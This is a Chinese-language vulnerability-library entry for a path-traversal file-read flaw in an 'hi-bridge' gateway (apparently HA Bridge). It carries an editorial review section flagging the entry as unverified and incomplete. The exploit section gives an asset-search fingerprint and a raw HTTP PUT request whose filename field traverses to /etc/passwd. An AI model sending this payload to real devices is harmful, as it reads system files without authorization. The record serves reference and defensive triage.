---
source: "wy876 漏洞文库"
id: "vw-9c9ad4ff1fb0f87025d4a8db"
entity_id: "ve-9c9ad4ff1fb0f87025d4a8db"
schema_version: "1"
title: "hi-bridge网关download存在文件读取漏洞"
product: "HA Bridge候选，标题hi-bridge网关"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未列版本/认证，PUT JSON请求"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/hi-bridge/hi-bridge%E7%BD%91%E5%85%B3download%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/aat3gchwm23g4rhd"
source_status: "recorded"
---

# hi-bridge网关download存在文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：HA Bridge候选，标题hi-bridge网关
- 本文讨论：api/devices/backup/download filename路径穿越
- 版本、权限与配置前提：未列版本/认证，PUT JSON请求
- 资料类型：文件读取请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 产品拼名hi-bridge与指纹HA Bridge不一致，不能仅按网关分类
- 无Content-Type/长度/响应，缺源代码和修复
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 产品身份、认证配置、版本和读取结果待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
hi-bridge网关download存在文件读取漏洞

# 二、影响版本
+ hi-bridge网关

# 三、资产测绘
```plain
title="HA Bridge"
```


# 四、漏洞复现
```http
PUT /api/devices/backup/download HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 


{"filename":"../../../../etc/passwd"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aat3gchwm23g4rhd>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
